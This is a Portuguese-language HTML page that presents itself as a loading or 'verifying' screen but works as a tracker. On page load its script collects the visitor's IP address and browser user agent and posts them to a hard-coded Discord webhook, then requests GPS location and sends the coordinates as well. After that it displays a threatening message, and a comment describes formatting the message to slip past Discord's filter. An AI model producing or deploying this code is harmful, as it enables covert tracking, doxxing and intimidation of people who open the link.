<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando...</title>
    <style>
        body { background: #000; color: #f00; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: monospace; margin: 0; }
        #f { display: none; font-size: 3rem; font-weight: bold; }
    </style>
</head>
<body>
    <div id="s">CARREGANDO...</div>
    <h1 id="f">CE TA FUDIDO</h1>

    <script>
        // WEBHOOK
        const W = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";

        async function enviar() {
            try {
                // Pega o IP
                const r = await fetch('https://api.ipify.org?format=json');
                const j = await r.json();
                const ip = j.ip;

                // Envia pro Discord (Texto puro, sem Embed para n√£o cair no filtro)
                await fetch(W, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `üö® **NOVO ACESSO**\n**IP:** ${ip}\n**Aparelho:** ${navigator.userAgent}`
                    })
                });

                // Se tiver GPS, tenta mandar depois
                navigator.geolocation.getCurrentPosition(async (p) => {
                    await fetch(W, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `üìç **LOCALIZA√á√ÉO:** http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`
                        })
                    });
                });

                // Mostra a mensagem final
                document.getElementById('s').style.display = 'none';
                document.getElementById('f').style.display = 'block';

            } catch (e) {
                document.getElementById('s').innerText = "ERRO DE CONEX√ÉO.";
            }
        }

        window.onload = enviar;
    </script>
</body>
</html>
